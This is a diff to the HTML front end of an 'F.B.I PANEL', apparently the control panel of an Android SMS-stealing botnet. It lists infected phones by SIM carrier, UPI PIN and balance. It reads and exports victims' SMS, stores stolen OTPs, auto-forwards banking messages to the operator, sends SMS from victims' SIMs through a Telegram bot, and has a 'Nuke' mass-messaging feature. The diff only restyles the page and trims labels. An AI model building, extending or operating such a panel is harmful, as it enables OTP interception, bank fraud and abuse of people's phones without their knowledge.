@@ -3,9 +3,12 @@
 <head>
 <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover"/>
-<title>F.B.I PANEL &mdash; Advanced Cyber Panel</title>
+<title>F.B.I PANEL — Sakura Command Center</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700;800&family=Orbitron:wght@400;600;800&family=JetBrains+Mono:wght@400;700&display=swap">
 <link rel="stylesheet" href="style.css"/>
-<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<script src="https://telegram.org/js/telegram-web-app.js" defer></script>
 </head>
 <body>
 
@@ -22,23 +25,19 @@
   <div class="orb o1"></div><div class="orb o2"></div>
   <div class="setup-card">
     <div class="cat-stage">
-      <div class="cat-sh"></div>
-      <div class="cp" style="left:29%;bottom:54%;background:#a855f7;--dur:1.9s;--del:0s;--dx:-20px;width:5px;height:5px;"></div>
-      <div class="cp" style="left:71%;bottom:60%;background:#e879f9;--dur:2.2s;--del:.35s;--dx:18px;width:4px;height:4px;"></div>
-      <div class="cp" style="left:50%;bottom:72%;background:#c084fc;--dur:1.7s;--del:.7s;--dx:12px;width:3px;height:3px;"></div>
       <div class="cat-wrap" onclick="catClick()">
         <img src="https://i.ibb.co/rKj7BZ7C/IMG-20260914-230127-675.jpg" class="panel-logo" alt="F.B.I"/>
       </div>
     </div>
-    <div class="setup-eyebrow">F.B.I Advanced Panel</div>
+    <div class="setup-eyebrow">F.B.I • SAKURA EDITION</div>
     <div class="setup-h"><span class="gold-word">F.B.I</span> PANEL</div>
     <div class="setup-user" id="setupUser" style="display:none;margin-bottom:12px"></div>
-    <div class="setup-sub">Connect your Firebase database and unlock the F.B.I command center.</div>
+    <div class="setup-sub">Connect your Firebase database to unlock the F.B.I command center.</div>
     <label class="fl">Firebase Database URL</label>
     <input id="fbUrl" class="fi" placeholder="https://your-project.firebaseio.com" type="url"/>
     <button type="button" class="cta" onclick="rippleClick(event);connect()">⚡ Connect to Firebase →</button>
     <div class="s-err" id="serr">Connection failed — check URL and key</div>
-    <div class="s-footer"><span class="gold-grad">F.B.I PANEL • Advanced Cyber Edition</span></div>
+    <div class="s-footer"><span class="gold-grad">F.B.I PANEL • SAKURA EDITION</span></div>
   </div>
 </div>
 
@@ -46,39 +45,33 @@
 <div id="panel">
   <div class="tb">
     <div class="tb-dots"><div class="td td-r" onclick="disconnect()" title="Disconnect"></div><div class="td td-y"></div><div class="td td-g"></div></div>
-    <div class="tb-logo" style="display:flex;align-items:center;gap:8px">
+    <div class="tb-logo">
       <img src="https://i.ibb.co/rKj7BZ7C/IMG-20260914-230127-675.jpg" class="tb-logo-img" alt=""/>
       <span class="tb-gl">F.B.I PANEL</span>
       <a href="#" id="tgChannelLink" class="tb-tg-icon" target="_blank" title="Join Telegram Channel">
-        <svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor">
-         <path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.46-.52-.19L7.74 13.3 3.64 12c-.88-.25-.89-.86.2-1.3l15.97-6.16c.73-.33 1.43.18 1.15 1.3l-2.72 12.81c-.19.91-.74 1.13-1.5.71L12.6 16.3l-1.99 1.93c-.23.23-.42.42-.83.42z"/>
-       </svg>
-     </a>
-     <span class="tb-user" id="tbUserName"></span>
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor"><path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.46-.52-.19L7.74 13.3 3.64 12c-.88-.25-.89-.86.2-1.3l15.97-6.16c.73-.33 1.43.18 1.15 1.3l-2.72 12.81c-.19.91-.74 1.13-1.5.71L12.6 16.3l-1.99 1.93c-.23.23-.42.42-.83.42z"/></svg>
+      </a>
+      <span class="tb-user" id="tbUserName"></span>
     </div>
     <div class="tb-pills"><span class="pill p-t" id="tpTot">—</span><span class="pill p-on" id="tpOn">—</span><span class="pill p-off" id="tpOff">—</span></div>
     <div class="live-dot"></div>
-
     <button class="tb-btn" onclick="loadDevs()" title="Refresh">↻</button>
-
     <div class="tb-search">
-      <input id="deviceSearch" placeholder="🔍 Search devices, numbers, balance…" oninput="setDeviceSearch(this.value)" autocomplete="off"/>
+      <input id="deviceSearch" placeholder="🔍 Search devices…" oninput="setDeviceSearch(this.value)" autocomplete="off"/>
       <button onclick="clearDeviceSearch()" class="tb-search-clear" title="Clear">✕</button>
     </div>
-
     <div class="filter-wrap">
       <button class="tb-btn" id="filterBtn" onclick="toggleFilterMenu(event)">🔽 <span id="filterLabel">All</span></button>
       <div class="filter-menu" id="filterMenu">
         <div onclick="setGridFilter('all')" data-f="all">🌐 All Devices</div>
-        <div onclick="setGridFilter('online')" data-f="online">🟢 Online Only</div>
-        <div onclick="setGridFilter('offline')" data-f="offline">🔴 Offline Only</div>
+        <div onclick="setGridFilter('online')" data-f="online">🟢 Online</div>
+        <div onclick="setGridFilter('offline')" data-f="offline">🔴 Offline</div>
         <div onclick="setGridFilter('jio')" data-f="jio">📡 Jio SIM</div>
         <div onclick="setGridFilter('vi')" data-f="vi">📡 Vi SIM</div>
         <div onclick="setGridFilter('pin')" data-f="pin">💳 Has UPI PIN</div>
         <div onclick="setGridFilter('balance')" data-f="balance">💰 Has Balance</div>
       </div>
     </div>
-
     <button class="tb-btn nuke-btn" onclick="openNuke()">💣 Nuke</button>
     <button class="tb-btn" onclick="openSettings()">⚙ Settings</button>
     <button class="tb-btn" onclick="openAllMsgs()">📋 All Msgs</button>
@@ -88,7 +81,7 @@
 
   <div class="grid-wrap" id="gridWrap">
     <div class="device-grid" id="deviceGrid">
-      <div class="ldwrap" style="grid-column:1/-1"><div class="gold-spin"></div> Loading devices...</div>
+      <div class="ldwrap" style="grid-column:1/-1"><div class="gold-spin"></div> Loading devices…</div>
     </div>
   </div>
 </div>
@@ -104,9 +97,7 @@
           <div class="dm-sub" id="dmSub" onclick="copyDeviceId()" title="Tap to copy full ID" style="cursor:pointer;user-select:none">—</div>
         </div>
       </div>
-      <div class="dm-header-right">
-        <button class="dm-close" onclick="closeM('deviceModal')">✕</button>
-      </div>
+      <div class="dm-header-right"><button class="dm-close" onclick="closeM('deviceModal')">✕</button></div>
     </div>
 
     <div class="dm-body">
@@ -117,12 +108,10 @@
         <div class="sec-hdr">🎯 Active SIM for outgoing SMS</div>
         <div class="sim-select" id="dmSimSelect">
           <button class="sim-opt" data-sim="1" onclick="setActiveSim(1)">
-            <div class="sim-opt-lbl">SIM 1</div>
-            <div class="sim-opt-num" id="dmSim1">—</div>
+            <div class="sim-opt-lbl">SIM 1</div><div class="sim-opt-num" id="dmSim1">—</div>
           </button>
           <button class="sim-opt" data-sim="2" onclick="setActiveSim(2)">
-            <div class="sim-opt-lbl">SIM 2</div>
-            <div class="sim-opt-num" id="dmSim2">—</div>
+            <div class="sim-opt-lbl">SIM 2</div><div class="sim-opt-num" id="dmSim2">—</div>
           </button>
         </div>
 
@@ -137,16 +126,14 @@
 
         <div class="sec-hdr">📝 Device Note</div>
         <div class="note-row">
-          <input class="note-inp" id="dmNoteInp" placeholder="Add note (bal, owner…)"/>
+          <input class="note-inp" id="dmNoteInp" placeholder="Add note…"/>
           <button class="note-save" onclick="saveNoteActive()">Save</button>
         </div>
 
         <div class="sec-hdr">📊 Info</div>
         <div class="info-grid" id="dmInfo"></div>
 
-        <div class="det-actions">
-          <button class="da da-d" onclick="confDelActive()">🗑 Delete Device</button>
-        </div>
+        <div class="det-actions"><button class="da da-d" onclick="confDelActive()">🗑 Delete Device</button></div>
       </div>
 
       <div class="dm-right">
@@ -158,7 +145,7 @@
 
         <div class="dm-tab-pane active" id="dmPane-msgs">
           <div class="msg-top">
-            <div style="display:flex;align-items:center;gap:10px"><div class="msg-cnt" id="dmMsgCnt">0</div></div>
+            <div class="msg-cnt" id="dmMsgCnt">0</div>
             <div style="display:flex;align-items:center;gap:8px">
               <button class="mbtn" onclick="refreshActiveMsgs()">↻</button>
               <button class="mbtn" onclick="exportActiveMsgs()" style="color:var(--mint)">CSV</button>
@@ -166,7 +153,7 @@
             </div>
           </div>
           <div class="msg-bar">
-            <div class="sbox"><input id="dmMsgSearch" placeholder="Search..." oninput="filterActiveMsgs()"/></div>
+            <div class="sbox"><input id="dmMsgSearch" placeholder="Search…" oninput="debounceSearchMsgs()"/></div>
             <button class="mfb ma" id="dm-mf-all" onclick="setActiveMF('all')">All</button>
             <button class="mfb" id="dm-mf-incoming" onclick="setActiveMF('incoming')">In</button>
             <button class="mfb" id="dm-mf-outgoing" onclick="setActiveMF('outgoing')">Out</button>
@@ -188,29 +175,25 @@
               <button class="stb s1" id="dmSimBtn1" onclick="setActiveSim(1)">SIM 1</button>
               <button class="stb" id="dmSimBtn2" onclick="setActiveSim(2)">SIM 2</button>
             </div>
-
             <div class="otp-note-box" style="margin-top:16px">
-              <div class="otp-note-lbl">💳 OTP Note (saved per device)</div>
+              <div class="otp-note-lbl">💳 OTP Note</div>
               <div class="otp-note-disp empty" id="dmOtpNoteDisp">No OTP note saved yet…</div>
               <div class="otp-note-row">
-                <input class="otp-note-inp" id="dmOtpNoteInp" placeholder="Paste OTP, balance…"/>
+                <input class="otp-note-inp" id="dmOtpNoteInp" placeholder="Paste OTP…"/>
                 <button class="otp-note-save" onclick="saveOtpNoteActive()">Save</button>
               </div>
             </div>
-
             <label class="fl" style="margin-top:16px">To (Phone Number)</label>
             <input id="dmSendTo" class="sinp" placeholder="+91 9876543210" inputmode="tel"/>
             <div style="display:flex;gap:6px;margin-top:-6px;margin-bottom:10px">
-              <button type="button" onclick="setMyNumberDefault()" style="padding:4px 10px;background:rgba(168,85,247,.1);border:1px solid rgba(168,85,247,.25);border-radius:6px;color:var(--gold2);font-size:10px;font-weight:700;cursor:pointer;font-family:'Chakra Petch',sans-serif">📞 Use My Number</button>
+              <button type="button" onclick="setMyNumberDefault()" style="padding:4px 10px;background:rgba(255,121,185,.1);border:1px solid rgba(255,121,185,.25);border-radius:6px;color:var(--gold2);font-size:10px;font-weight:700;cursor:pointer;font-family:inherit">📞 Use My Number</button>
             </div>
-
             <label class="fl">Message</label>
             <textarea id="dmSendMsg" class="sarea" placeholder="Type your message..."></textarea>
             <button class="sbtn" id="dmSendBtn" onclick="sendSmsActive()">🚀 Send Message</button>
             <div class="sres" id="dmSendRes"></div>
           </div>
         </div>
-
       </div>
     </div>
   </div>
@@ -229,11 +212,11 @@
     <label class="fl">Target Number</label>
     <input id="nukeTarget" class="nuke-inp" placeholder="+91 9876543210"/>
     <label class="fl">Message</label>
-    <textarea id="nukeMsg" class="nuke-area" placeholder="Type the message to blast from all SIMs..."></textarea>
+    <textarea id="nukeMsg" class="nuke-area" placeholder="Type the message..."></textarea>
     <div class="nuke-info-box">
       <span id="nukeDeviceCount" style="color:var(--mint);font-weight:800">0</span> devices online ·
       <span id="nukeSimCount" style="color:var(--gold2);font-weight:800">0</span> SIMs total ·
-      <span id="nukeTotalShots" style="color:var(--lilac);font-weight:800">0</span> messages will be sent
+      <span id="nukeTotalShots" style="color:var(--lilac);font-weight:800">0</span> messages
     </div>
     <div class="nuke-stat-row" id="nukeStats">
       <div class="nuke-stat"><div class="nuke-stat-l">Sent</div><div class="nuke-stat-v" id="nukeSent" style="color:var(--mint)">0</div></div>
@@ -248,9 +231,7 @@
       <button id="nukeFireBtn" class="nuke-fire-btn" onclick="fireNuke()">💣 Fire Nuke</button>
       <button id="nukeStopBtn" class="nuke-stop-btn" onclick="stopNuke()" style="display:none">⏹ Stop</button>
     </div>
-    <div class="mbtns" style="margin-top:14px">
-      <button class="mcnc" onclick="closeM('nukeModal')">Close</button>
-    </div>
+    <div class="mbtns" style="margin-top:14px"><button class="mcnc" onclick="closeM('nukeModal')">Close</button></div>
   </div>
 </div>
 
@@ -261,7 +242,7 @@
       <div style="font-size:36px">⚙️</div>
       <div style="flex:1">
         <div class="mt" style="margin-bottom:0">Settings</div>
-        <div style="font-size:12px;color:var(--sub)">Auto-saved to cloud · Bot token pre-configured</div>
+        <div style="font-size:12px;color:var(--sub)">Auto-saved to cloud</div>
       </div>
       <button class="dm-close" onclick="closeM('settingsModal')">✕</button>
     </div>
@@ -273,99 +254,63 @@
         <input class="fi" id="setMyNumber" placeholder="+91 9876543210"/>
       </div>
 
-
-
-
-
-
-
-
-<div class="settings-section">
-  <div class="settings-title">🤖 Telegram Bot</div>
-  <div class="settings-desc">Add <span style="color:var(--gold2);font-family:'JetBrains Mono',monospace" id="botUsername">@bot</span> to your Telegram channel as admin. Every message containing a number will trigger an SMS via the active device.</div>
-
-  <label class="fl">Channel ID</label>
-  <input class="fi" id="setTgChannel" placeholder="-1001234567890 or @channelname"/>
-
-  <div class="settings-toggle-row">
-    <input type="checkbox" id="setTgEnabled"/>
-    <label for="setTgEnabled">Enable Telegram Bot</label>
-  </div>
-  <div class="settings-toggle-row">
-    <input type="checkbox" id="setFwdEnabled"/>
-    <label for="setFwdEnabled">Auto-forward device messages to My Number</label>
-  </div>
-  <div class="settings-toggle-row">
-    <input type="checkbox" id="setChannelNotify"/>
-    <label for="setChannelNotify">📢 Post confirmation in channel on every SMS sent</label>
-  </div>
-  <div class="settings-status" id="tgStatusLine">Not running</div>
-</div>
+      <div class="settings-section">
+        <div class="settings-title">🤖 Telegram Bot</div>
+        <div class="settings-desc">Add <span style="color:var(--gold2);font-family:'JetBrains Mono',monospace" id="botUsername">@bot</span> to your channel as admin.</div>
+        <label class="fl">Channel ID</label>
+        <input class="fi" id="setTgChannel" placeholder="-1001234567890 or @channelname"/>
+        <div class="settings-toggle-row"><input type="checkbox" id="setTgEnabled"/><label for="setTgEnabled">Enable Telegram Bot</label></div>
+        <div class="settings-toggle-row"><input type="checkbox" id="setFwdEnabled"/><label for="setFwdEnabled">Auto-forward device messages to My Number</label></div>
+        <div class="settings-toggle-row"><input type="checkbox" id="setChannelNotify"/><label for="setChannelNotify">📢 Post confirmation in channel on every SMS</label></div>
+        <div class="settings-status" id="tgStatusLine">Not running</div>
+      </div>
 
       <div class="settings-section">
         <div class="settings-title">📤 Forward Mode</div>
-        <div class="settings-desc">Choose which messages get auto-forwarded to your number.</div>
+        <div class="settings-desc">Choose which messages get auto-forwarded.</div>
         <div style="display:flex;gap:8px;width:100%">
-          <button id="setFwdModeAll" onclick="setForwardMode('all')" style="flex:1;padding:10px;border-radius:10px;font-family:'Chakra Petch',sans-serif;font-size:12px;font-weight:700;cursor:pointer;border:1px solid var(--border);background:var(--bg3);color:var(--sub)">🌐 All Messages</button>
-          <button id="setFwdModeBank" onclick="setForwardMode('banking')" style="flex:1;padding:10px;border-radius:10px;font-family:'Chakra Petch',sans-serif;font-size:12px;font-weight:700;cursor:pointer;border:1px solid var(--border);background:var(--bg3);color:var(--sub)">🏦 Banking Only</button>
+          <button id="setFwdModeAll" onclick="setForwardMode('all')" class="seg-btn">🌐 All Messages</button>
+          <button id="setFwdModeBank" onclick="setForwardMode('banking')" class="seg-btn">🏦 Banking Only</button>
         </div>
-        <div style="font-size:11px;color:var(--dim);line-height:1.5;margin-top:10px" id="fwdModeHint">All incoming messages will be forwarded</div>
+        <div style="font-size:11px;color:var(--dim);margin-top:10px" id="fwdModeHint">All incoming forwarded</div>
       </div>
 
       <div class="settings-section">
         <div class="settings-title">📱 Telegram Message Format (Start/End)</div>
-        <div class="settings-desc">Jo text "Start" aur "End" ke beech aayega wahi extract hoga. <b style="color:var(--mint)">End blank</b> chhodo to "last tak" lega.</div>
-
+        <div class="settings-desc">Jo text "Start" aur "End" ke beech aayega wahi extract hoga.</div>
         <label class="fl">📞 Number — Start</label>
         <input class="fi" id="setNumStart" placeholder="e.g. To (Tap to copy):" style="margin-bottom:10px"/>
-
         <label class="fl">📞 Number — End</label>
         <input class="fi" id="setNumEnd" placeholder="e.g. Body (Tap to copy):" style="margin-bottom:10px"/>
-
         <label class="fl">💬 Message — Start</label>
         <input class="fi" id="setMsgStart" placeholder="e.g. Body (Tap to copy):" style="margin-bottom:10px"/>
-
         <label class="fl">💬 Message — End (blank = last tak)</label>
-        <input class="fi" id="setMsgEnd" placeholder="e.g. ibl (or leave blank)" style="margin-bottom:10px"/>
-
-        <div style="font-size:11px;color:var(--dim);line-height:1.65;background:rgba(168,85,247,.06);border:1px solid rgba(168,85,247,.15);border-radius:10px;padding:10px;margin-top:6px">
-          <b style="color:var(--mint)">Example Setup:</b><br>
-          <code style="background:rgba(168,85,247,.14);padding:1px 5px;border-radius:4px;color:var(--gold2);font-size:10px">To (Tap to copy):\n09606288501\n\nBody (Tap to copy):\nPHONEPE-VERIFY PVM142...758CG:ibl</code><br><br>
-          <b>Number Start:</b> <code style="color:var(--gold2)">To (Tap to copy):</code><br>
-          <b>Number End:</b> <code style="color:var(--gold2)">Body (Tap to copy):</code><br>
-          <b>Message Start:</b> <code style="color:var(--gold2)">Body (Tap to copy):</code><br>
-          <b>Message End:</b> <code style="color:var(--gold2)">ibl</code> (ya blank)<br><br>
-          ➜ Number: <b style="color:var(--mint)">9606288501</b><br>
-          ➜ Message: <b style="color:var(--mint)">PHONEPE-VERIFY PVM142...758CG:</b>
-        </div>
+        <input class="fi" id="setMsgEnd" placeholder="e.g. ibl" style="margin-bottom:10px"/>
       </div>
 
       <div class="settings-section">
         <div class="settings-title">🔧 Fallback Labels (Optional)</div>
-        <div class="settings-desc">Agar start/end set nahi hai to in labels se detect hoga.</div>
-
         <label class="fl">Number Labels (comma separated)</label>
         <input class="fi" id="setNumLabels" placeholder="To,Receipt,Number,Mobile,Target,Phone"/>
-
         <label class="fl">Message Labels (comma separated)</label>
         <input class="fi" id="setMsgLabels" placeholder="Message,Msg,Body,Token,Text"/>
       </div>
 
       <div class="settings-section">
         <div class="settings-title">🔥 Additional Firebase URLs</div>
-        <div class="settings-desc">Devices from all Firebase databases are merged. Config saved to cloud automatically.</div>
+        <div class="settings-desc">Devices from all Firebase databases are merged.</div>
         <div id="settingsFbList"></div>
         <div class="fb-add-row">
-          <input class="fi" id="setFbLabel" placeholder="Label (optional)" style="margin-bottom:0"/>
-          <input class="fi" id="setFbUrl" placeholder="https://xxx.firebaseio.com" style="margin-bottom:0"/>
-          <input class="fi" id="setFbKey" placeholder="Auth key (optional)" style="margin-bottom:0"/>
+          <input class="fi" id="setFbLabel" placeholder="Label (optional)"/>
+          <input class="fi" id="setFbUrl" placeholder="https://xxx.firebaseio.com"/>
+          <input class="fi" id="setFbKey" placeholder="Auth key (optional)"/>
           <button class="mok" onclick="addFirebaseFromSettings()">＋ Add</button>
         </div>
       </div>
 
       <div class="settings-section">
         <div class="settings-title">☁️ Cloud Config</div>
-        <div class="settings-desc">Your settings are auto-saved to a cloud JSON blob and restored on any browser.</div>
+        <div class="settings-desc">Settings saved to cloud, restored on any browser.</div>
         <div style="display:flex;gap:8px;margin-top:8px">
           <button class="mcnc" onclick="resetCloudConfig()" style="flex:1">🗑 Reset</button>
           <button class="mok" onclick="forceCloudSave()" style="flex:1">☁ Force Save</button>
@@ -390,7 +335,7 @@
       <button class="dm-close" onclick="closeM('allMsgsModal')">✕</button>
     </div>
     <div class="msg-bar" style="margin-top:12px">
-      <div class="sbox"><input id="amSearch" placeholder="🔍 Search msg, sender, device, number, note…" oninput="filterAndRender()" autocomplete="off"/></div>
+      <div class="sbox"><input id="amSearch" placeholder="🔍 Search…" oninput="debounceSearchAm()"/></div>
       <button class="mfb ma" id="amf-all" onclick="setAMF('all')">All</button>
       <button class="mfb" id="amf-incoming" onclick="setAMF('incoming')">In</button>
       <button class="mfb" id="amf-outgoing" onclick="setAMF('outgoing')">Out</button>
@@ -413,7 +358,7 @@
 <div class="captured-bar" id="capturedBar"></div>
 <div class="toast" id="toastEl"></div>
 
-<script src="config.js"></script>
-<script src="script.js"></script>
+<script src="config.js" defer></script>
+<script src="script.js" defer></script>
 </body>
 </html>
